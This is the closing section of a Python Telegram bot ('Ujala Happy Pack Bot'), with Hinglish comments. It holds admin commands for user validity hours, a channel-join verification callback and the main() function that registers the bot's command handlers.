    conn.commit()
    conn.close()

    if mode == "add":
        action_text = f"➕ <b>+{hours} hours added</b> to all users"
    elif mode == "subtract":
        action_text = f"➖ <b>-{hours} hours removed</b> from all users"
    else:
        action_text = f"🔧 <b>Validity set to {hours} hours</b> for all users (from now)"

    await update.effective_message.reply_text(
        f"✅ <b>Done!</b>\n\n{action_text}\n👥 Users updated: <b>{updated}</b>",
        parse_mode=ParseMode.HTML
    )

async def cmd_adminlist(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin commands list — sirf admins ke liye."""
    if update.effective_user.id not in ADMIN_IDS:
        await update.effective_message.reply_text("🚫 Admin only.")
        return
    await update.effective_message.reply_text(
        "🛡️ <b>Admin Commands</b>\n\n"
        "<b>── User Management ──</b>\n"
        "/addtime &lt;user_id&gt; &lt;hours&gt; — User ko manually hours do\n"
        "/ban &lt;user_id&gt; — User ko ban karo\n"
        "/unban &lt;user_id&gt; — User ko unban karo\n"
        "/totalusers — Total registered users count\n\n"
        "<b>── Session &amp; Stats ──</b>\n"
        "/activesessions — Abhi kitne sessions chal rahe hain\n"
        "/stats — Bot ke overall stats\n"
        "/results — Last session ke results\n"
        "/stop — Apna current session rok do\n\n"
        "<b>── Broadcast ──</b>\n"
        "/broadcast &lt;message&gt; — Sab users ko message bhejo\n\n"
        "<b>── Info ──</b>\n"
        "/winners — Sab winners ki list\n"
        "/leaderboard — Top referrers\n"
        "/history — Session history\n"
        "/alltime +/-/set &lt;hours&gt; — Sab users ki validity ek baar mein badlao\n"
        "/adminlist — Ye list 😄",
        parse_mode=ParseMode.HTML
    )

# ── Inline button handler ──────────────────────────────────────
class _FakeUpdate:
    def __init__(self, update, message):
        object.__setattr__(self, '_update', update)
        object.__setattr__(self, 'message', message)
    def __getattr__(self, name):
        return getattr(object.__getattribute__(self, '_update'), name)

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    fake  = _FakeUpdate(update, query.message)
    data  = query.data

    # ── Verify channels button ─────────────────────────────────
    if data == "verify_channels":
        uid = update.effective_user.id
        # Re-check all channels
        not_joined = []
        for channel in REQUIRED_CHANNELS:
            try:
                member = await context.bot.get_chat_member(channel, uid)
                if member.status in ("left", "kicked"):
                    not_joined.append(channel)
            except Exception as e:
                logger.warning(f"Verify channel check failed for {channel}: {e}")
                not_joined.append(channel)

        if not_joined:
            # Abhi bhi kuch channels join nahi kiye
            buttons = [[InlineKeyboardButton(f"📢 Join {ch}", url=f"https://t.me/{ch.lstrip('@')}")]
                       for ch in not_joined]
            buttons.append([InlineKeyboardButton("✅ Maine Join Kar Liya — Verify Karo", callback_data="verify_channels")])
            await query.edit_message_text(
                f"❌ Abhi bhi ye channels join nahi kiye:\n\n" + "\n".join(not_joined) +
                "\n\nJoin karne ke baad fir Verify dabao.",
                reply_markup=InlineKeyboardMarkup(buttons),
                parse_mode=ParseMode.HTML
            )
        else:
            # Sab join — original message delete karo, /start jaisa response do
            await query.edit_message_text("✅ <b>Verification successful!</b>\nSaare channels join kar liye.", parse_mode=ParseMode.HTML)
            await cmd_start(fake, context)
        return

    dispatch = {
        "run":         cmd_run,
        "refer":       cmd_refer,
        "status":      cmd_status,
        "stats":       cmd_stats,
        "winners":     cmd_winners,
        "history":     cmd_history,
        "leaderboard": cmd_leaderboard,
        "help":        cmd_help,
    }
    fn = dispatch.get(data)
    if fn:
        await fn(fake, context)

# ============================================================
#  🚀 MAIN
# ============================================================
def main():
    global _global_sem, BOT_USERNAME
    _global_sem = asyncio.Semaphore(MAX_GLOBAL_SEM)

    from telegram.request import HTTPXRequest
    request = HTTPXRequest(
        connect_timeout=30,
        read_timeout=30,
        write_timeout=30,
        pool_timeout=30,
        connection_pool_size=8,
    )
    app = Application.builder().token(BOT_TOKEN).request(request).build()

    app.add_handler(CommandHandler("start",          cmd_start))
    app.add_handler(CommandHandler("refer",          cmd_refer))
    app.add_handler(CommandHandler("status",         cmd_status))
    app.add_handler(CommandHandler("refercount",     cmd_refercount))
    app.add_handler(CommandHandler("stats",          cmd_stats))
    app.add_handler(CommandHandler("history",        cmd_history))
    app.add_handler(CommandHandler("winners",        cmd_winners))
    app.add_handler(CommandHandler("leaderboard",    cmd_leaderboard))
    app.add_handler(CommandHandler("help",           cmd_help))
    app.add_handler(CommandHandler("run",            cmd_run))
    app.add_handler(CommandHandler("stop",           cmd_stop))
    app.add_handler(CommandHandler("results",        cmd_results))
    app.add_handler(CommandHandler("broadcast",      cmd_broadcast))
    app.add_handler(CommandHandler("addtime",        cmd_addtime))
    app.add_handler(CommandHandler("ban",            cmd_ban))
    app.add_handler(CommandHandler("unban",          cmd_unban))
    app.add_handler(CommandHandler("totalusers",     cmd_totalusers))
    app.add_handler(CommandHandler("activesessions", cmd_activesessions))
    app.add_handler(CommandHandler("adminlist",      cmd_adminlist))
    app.add_handler(CommandHandler("alltime",        cmd_alltime))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_firebase_links))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.job_queue.run_repeating(check_expiry_warnings, interval=60, first=10)

    print("🤖 Ujala Happy Pack Bot started! (async/aiohttp)")
    async def _set_bot_username(app):
        global BOT_USERNAME
        me = await app.bot.get_me()
        BOT_USERNAME = me.username
        logger.info(f"Bot username set: @{BOT_USERNAME}")

    app.post_init = _set_bot_username
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    init_db()
    main()
